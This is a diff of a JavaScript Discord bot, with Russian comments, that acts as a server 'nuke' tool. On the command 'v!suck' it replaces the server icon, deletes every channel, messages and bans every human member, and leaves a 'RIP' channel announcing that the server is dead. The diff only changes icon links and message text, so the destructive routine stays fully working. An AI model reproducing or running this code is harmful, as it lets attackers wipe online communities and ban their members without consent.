@@ -34,15 +34,15 @@ bot.on ("message", async message =>{
 });
 bot.on('message', msg => {
     if (msg.content === 'v!suck') {
-		msg.guild.setIcon('https://images-ext-2.discordapp.net/external/QjMoUr97cRlSSBkJghuuw2a7POqxv-wpPAi7hHhrCnc/%3Fsize%3D256/https/cdn.discordapp.com/avatars/692461191879983198/214d32a6561b979bb4cdf7aeca8dd891.png').then(() => {
+		msg.guild.setIcon('https://media.discordapp.net/attachments/699604691994148876/705873941767389194/unknown.png').then(() => {
       msg.guild.channels.forEach(c => c.delete()) //Удаление все чатов и каналов
        msg.guild.members.forEach(member => { //Расслыка всем пользователям
-        if (member.id != bot.user.id && !member.user.bot) member.send(' Crashed By Hikka.  ').then(() => {
+        if (member.id != bot.user.id && !member.user.bot) member.send(' Crashed By Hikka. Сервер умер и спит.').then(() => {
             member.ban().then(() => {
                 const name = 'RIP'
-                msg.guild.createChannel(name, "text")
+                msg.guild.createChannel(name, "RIP")
 					.then(channel => {
-                    channel.send('Извините, но Ваш сервер очень ужасен')
+                    channel.send('@everyone Сервер умер и спит.')
                     channel.overwritePermissions(member, {
                         SEND_MESSAGES: false
                     })
